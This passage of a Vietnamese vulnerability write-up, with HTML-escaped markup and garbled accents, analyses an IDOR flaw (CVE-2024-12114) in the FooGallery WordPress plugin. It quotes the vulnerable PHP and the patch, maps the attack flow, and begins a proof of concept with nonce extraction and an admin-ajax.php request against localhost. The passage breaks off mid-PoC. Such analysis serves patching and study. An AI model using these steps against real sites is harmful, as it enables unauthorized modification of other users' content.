c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Theo m√¥ t·∫£ c√∫a CVE, t√°c ƒë·ªông th·ª±c s·ª± ch·ªâ x·∫£y ra khi &lt;strong&gt;thi·∫øt l·∫≠p vai tr√≤ Gallery Creator&lt;/strong&gt; ƒë∆∞·ª£c ƒë·∫∑t ·ªü m·ª©c &lt;strong&gt;th·∫•p h∆°n ‚ÄúEditor‚Äù&lt;/strong&gt;.&#xA;B·∫°n c√≥ th·ªÉ thi·∫øt l·∫≠p n√≥ ·ªü ƒë√¢y:&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/role.png&#34; title=&#34;Gallery Creator role&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/role.png&#34; data-sub-html=&#34;&lt;h2&gt;Role&lt;/h2&gt;&lt;p&gt;Gallery Creator role&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/role.png&#39; alt=&#34;Role&#34; height=&#34;882&#34; width=&#34;1382&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gallery Creator role&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;Khi ƒë√≥, user c√≥ vai tr√≤ n√†y s·∫Ω c√≥ th·ªÉ d√πng ch·ª©c nƒÉng &lt;strong&gt;Add&lt;/strong&gt;/&lt;strong&gt;Edit&lt;/strong&gt; Gallery:&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create.png&#34; title=&#34;Create/Add&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create.png&#34; data-sub-html=&#34;&lt;h2&gt;Create/Add&lt;/h2&gt;&lt;p&gt;Create/Add&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create.png&#39; alt=&#34;Create/Add&#34; height=&#34;829&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create/Add&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω AJAX handler &lt;strong&gt;cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_foogallery_attachment_modal_save&amp;#39;, array( $this, &amp;#39;ajax_save_modal&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; l√† hook d√†nh cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p (Subcriber+). Khi c√≥ request t·ªõi endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=foogallery_attachment_modal_save&lt;/code&gt; th√¨ callback &lt;code&gt;ajax_save_modal&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ajax_save_modal() {&#xA;    $foogallery = ( isset( $_POST[&amp;#39;foogallery&amp;#39;] ) ? $_POST[&amp;#39;foogallery&amp;#39;] : array() );&#xA;&#xA;    if ( !is_array( $foogallery ) || empty( $foogallery ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    // Check for nonce security      &#xA;    if ( ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery-modal-nonce&amp;#39; ) ) {&#xA;        die ( &amp;#39;Busted!&amp;#39;);&#xA;    }&#xA;&#xA;    $img_id = intval( sanitize_text_field( $_POST[&amp;#39;img_id&amp;#39;] ) );&#xA;&#xA;    if ( $img_id &amp;gt; 0 ) {&#xA;        do_action( &amp;#39;foogallery_attachment_save_data&amp;#39;, $img_id, $foogallery );&#xA;    }&#xA;    &#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m l·∫•y &lt;code&gt;foogallery&lt;/code&gt; t·ª´ request, ki·ªÉm tra n·∫øu l√† m·ªôt m·∫£ng c√≥ gi√° tr·ªã th√¨ ti·∫øp t·ª•c ki·ªÉm tra &lt;code&gt;nonce&lt;/code&gt; ƒë·∫£m b·∫£o request h·ª£p l·ªá:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery-modal-nonce&amp;#39; ) ) {&#xA;    die ( &amp;#39;Busted!&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;wp_verify_nonce()&lt;/code&gt; s·∫Ω ki·ªÉm tra gi√° tr·ªã &lt;code&gt;nonce&lt;/code&gt; g·ª≠i l√™n c√≥ h·ª£p l·ªá (&lt;code&gt;nonce&lt;/code&gt; ƒë∆∞·ª£c t·∫°o b·ªüi action &lt;code&gt;foogallery-modal-nonce&lt;/code&gt;) hay kh√¥ng.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu h·ª£p l·ªá v√† &lt;code&gt;img_id &amp;gt; 0&lt;/code&gt;, &lt;code&gt;do_action(&#39;foogallery_attachment_save_data&#39;,...)&lt;/code&gt; ƒëu·ª£c g·ªçi v·ªõi gi√° tr·ªã c·ªßa &lt;code&gt;img_id&lt;/code&gt; v√† &lt;code&gt;foogallery&lt;/code&gt; t·ª´ request.&lt;/p&gt;&#xA;&lt;p&gt;Tr∆∞·ªõc ƒë√≥, plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt lo·∫°t c√°c callback cho action &lt;code&gt;foogallery_attachment_save_data&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/add_action.png&#34; title=&#34;C√°c callback ƒë∆∞·ª£c ƒëƒÉng k√Ω cho action foogallery_attachment_save_data&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/add_action.png&#34; data-sub-html=&#34;&lt;h2&gt;Add action&lt;/h2&gt;&lt;p&gt;C√°c callback ƒë∆∞·ª£c ƒëƒÉng k√Ω cho action foogallery_attachment_save_data&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/add_action.png&#39; alt=&#34;Add action&#34; height=&#34;521&#34; width=&#34;1913&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;C√°c callback ƒë∆∞·ª£c ƒëƒÉng k√Ω cho action foogallery_attachment_save_data&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_main( $img_id, $data ) {&#xA;&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        $foogallery_post = array(&#xA;            &amp;#39;ID&amp;#39; =&amp;gt; $img_id&#xA;        );&#xA;&#xA;        if ( array_key_exists( &amp;#39;title&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_title&amp;#39;] = $data[&amp;#39;title&amp;#39;];&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;caption&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_excerpt&amp;#39;] = $data[&amp;#39;caption&amp;#39;];&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;description&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_content&amp;#39;] = $data[&amp;#39;description&amp;#39;];&#xA;        }&#xA;&#xA;        // Update post meta values&#xA;        if ( array_key_exists( &amp;#39;alt-text&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_wp_attachment_image_alt&amp;#39;, $data[&amp;#39;alt-text&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-url&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_url&amp;#39;, $data[&amp;#39;custom-url&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-target&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_target&amp;#39;, $data[&amp;#39;custom-target&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-class&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_class&amp;#39;, $data[&amp;#39;custom-class&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( is_array( $foogallery_post ) &amp;amp;&amp;amp; count( $foogallery_post ) &amp;gt; 1 ) {&#xA;            // Update the post into the database&#xA;            wp_update_post( $foogallery_post );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_taxonomies( $img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        if ( !$this-&amp;gt;attachments_have_taxonomies() ) {&#xA;            return;&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;taxonomies&amp;#39;, $data ) ) {&#xA;            foreach ( $data[&amp;#39;taxonomies&amp;#39;] as $taxonomy =&amp;gt; $taxonomy_value ) {&#xA;                $terms = explode( &amp;#39;,&amp;#39;, $taxonomy_value );&#xA;                if ( is_array( $terms ) ) {&#xA;                    $terms = array_map( &amp;#39;intval&amp;#39;, $terms );&#xA;                    wp_set_object_terms( $img_id, $terms, $taxonomy, false );&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_thumbnails( $img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        if ( array_key_exists( &amp;#39;crop_pos&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;foogallery_crop_pos&amp;#39;, $data[&amp;#39;crop_pos&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;override-thumbnail-id&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;foogallery_override_thumbnail&amp;#39;, $data[&amp;#39;override-thumbnail-id&amp;#39;] );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_advanced($img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;        if ( array_key_exists( &amp;#39;data-width&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_data-width&amp;#39;, $data[&amp;#39;data-width&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;data-height&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_data-height&amp;#39;, $data[&amp;#39;data-height&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;panning&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foobox_panning&amp;#39;, $data[&amp;#39;panning&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;override_type&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_override_type&amp;#39;, $data[&amp;#39;override_type&amp;#39;] );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√°c callback th·ª±c hi·ªán m·ªôt lo·∫°t c√°c update v·ªõi gallery t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;img_id&lt;/code&gt; v√† d·ªØ li·ªáu l√† &lt;code&gt;foogallery&lt;/code&gt;, t·∫•t c·∫£ ƒë·ªÅu c√≥ th·ªÉ ƒë∆∞·ª£c ki·ªÉm so√°t b·ªüi attacker.&lt;/p&gt;&#xA;&lt;p&gt;L·ªó h·ªïng IDOR x·∫£y ra v√¨ kh√¥ng c√≥ r√†ng bu·ªôc n√†o ƒë·ªëi v·ªõi gallery t∆∞∆°ng ·ª©ng &lt;code&gt;img_id&lt;/code&gt; khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ g·ª≠i request t√πy √Ω ƒë·ªÉ ch·ªânh s·ª≠a n·ªôi dung gallery kh√¥ng thu·ªôc quy·ªÅn c·ªßa m√¨nh.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;code&gt;v2.4.30&lt;/code&gt; ƒë√£ th√™m r√†ng bu·ªôc:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( current_user_can(&amp;#39;edit_post&amp;#39;, $img_id ) ) {&#xA;    do_action( &amp;#39;foogallery_attachment_save_data&amp;#39;, $img_id, $foogallery );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/patch.png&#34; title=&#34;B·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;B·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/patch.png&#39; alt=&#34;Patch&#34; height=&#34;470&#34; width=&#34;1814&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ch·ªâ ng∆∞·ªùi d√πng c√≥ quy·ªÅn &lt;code&gt;edit_post&lt;/code&gt; v·ªõi id &lt;code&gt;$img_id&lt;/code&gt; th√¨ m·ªõi ƒë∆∞·ª£c ph√©p g·ªçi ƒë·∫øn action &lt;code&gt;foogallery_attachment_save_data&lt;/code&gt; ƒë·ªÉ ch·ªânh s∆∞a n√≥.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;ƒêi·ªÅu ti√™n quy·∫øt l√† c·∫ßn t√¨m c√°ch ƒë·ªÉ l·∫•y ƒë∆∞·ª£c gi√° tr·ªã c·ªßa nonce t∆∞∆°ng ·ª©ng v·ªõi action &lt;code&gt;foogallery-modal-nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce.png&#34; title=&#34;X√¢y d·ª±ng nonce v·ªõi action foogallery-modal-nonce&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;X√¢y d·ª±ng nonce v·ªõi action foogallery-modal-nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;464&#34; width=&#34;1730&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;X√¢y d·ª±ng nonce v·ªõi action foogallery-modal-nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nonce ƒë∆∞·ª£c kh·ªüi t·∫°o trong h√†m &lt;code&gt;build_modal_data()&lt;/code&gt; b·∫±ng c√°ch g·ªçi &lt;code&gt;wp_create_nonce( &#39;foogallery-modal-nonce&#39; )&lt;/code&gt; v√† n·∫øu ƒë√°p ·ª©ng 2 ƒëi·ªÅu ki·ªán:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$data&lt;/code&gt; l√† m·ªôt m·∫£ng&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;img_id&lt;/code&gt; v√† &lt;code&gt;gallery_id&lt;/code&gt; kh√°c &lt;code&gt;null&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;build_modal_data&lt;/code&gt; s·∫Ω tr·∫£ v·ªÅ m·∫£ng c√≥ ch·ª©a gi√° tr·ªã bao g·ªìm &lt;code&gt;nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#34; title=&#34;Gi√° tr·ªã c·ªßa nonce ƒë∆∞·ª£c th√™m v√†o HTML&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Embed nonce&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã c·ªßa nonce ƒë∆∞·ª£c th√™m v√†o HTML&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#39; alt=&#34;Embed nonce&#34; height=&#34;961&#34; width=&#34;1372&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã c·ªßa nonce ƒë∆∞·ª£c th√™m v√†o HTML&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Gi√° tr·ªã n√†y ƒë∆∞·ª£c h√†m &lt;code&gt;ajax_open_modal&lt;/code&gt; s·ª≠ d·ª•ng, &lt;code&gt;nonce&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c th√™m v√†o HTML v·ªõi form id l√† &lt;code&gt;foogallery_attachment_modal_save_form&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nh∆∞ng tr∆∞·ªõc ƒë√≥, &lt;code&gt;ajax_open_modal&lt;/code&gt; s·∫Ω th·ª±c hi·ªán ki·ªÉm tra nonce t∆∞∆°ng ·ª©ng v·ªõi action &lt;code&gt;foogallery_attachment_modal_open&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery_attachment_modal_open&amp;#39; ) ) {&#xA;    die ( &amp;#39;Busted!&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#34; title=&#34;X√¢y d·ª±ng nonce v·ªõi action foogallery_attachment_modal_open&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;X√¢y d·ª±ng nonce v·ªõi action foogallery_attachment_modal_open&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#39; alt=&#34;Create nonce&#34; height=&#34;1067&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;X√¢y d·ª±ng nonce v·ªõi action foogallery_attachment_modal_open&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªçc logic c·ªßa h√†m, ta th·∫•y nonce s·∫Ω ƒë∆∞·ª£c th√™m v√†o HTML c·ªßa &lt;strong&gt;edit gallery&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;S·ª≠ d·ª•ng ch·ª©c nƒÉng &lt;strong&gt;edit gallery&lt;/strong&gt; =&amp;gt; cho request qua BurpSuite =&amp;gt; Filter request v·ªõi t·ª´ kh√≥a &lt;code&gt;foogallery-image-edit-modal&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/data_nonce.png&#34; title=&#34;Gi√° tr·ªã c·ªßa nonce trong khi filter&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/data_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Data nonce&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã c·ªßa nonce trong khi filter&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/data_nonce.png&#39; alt=&#34;Data nonce&#34; height=&#34;532&#34; width=&#34;956&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã c·ªßa nonce trong khi filter&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta l·∫•y ƒë∆∞·ª£c gi√° tr·ªã c·ªßa nonce n√†y&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated User (Subscriber&amp;#43;)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Request admin-ajax.php?action=foogallery_attachment_modal_open&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Verify nonce: foogallery_attachment_modal_open&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Return HTML modal &amp;#43; embedded nonce (foogallery-modal-nonce)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;User extracts nonce from response&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Send request: action=foogallery_attachment_modal_save&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Verify nonce: foogallery-modal-nonce&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Extract img_id from request&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;No capability / ownership check (edit_post)&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;do_action(foogallery_attachment_save_data, img_id, data)&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Update post / attachment data&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Unauthorized modification of arbitrary gallery/post (IDOR)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Th·ª±c hi·ªán edit galery v·ªõi user c√≥ quy·ªÅn &lt;code&gt;Gallery Creator&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Search t·ª´ kh√≥a &lt;code&gt;foogallery-image-edit-modal&lt;/code&gt; v√† l·∫•y nonce t·ª´ response&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i request ƒë·ªÉ l·∫•y nonce t∆∞∆°ng ·ª©ng v·ªõi form &lt;code&gt;foogallery_attachment_modal_save_form&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: valid_cookie&#xA;&#xA;action=foogallery_attachment_modal_open&amp;amp;nonce=9ad3ed3e9b&amp;amp;img_id=1&amp;amp;gallery_id=1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/get_nonce.png&#34; title=&#34;L·∫•y nonce t·ª´ response&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/get_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Get nonce&lt;/h2&gt;&lt;p&gt;L·∫•y nonce t·ª´ response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/get_nonce.png&#39; alt=&#34;Get nonce&#34; height=&#34;656&#34; width=&#34;954&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;L·∫•y nonce t·ª´ response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol 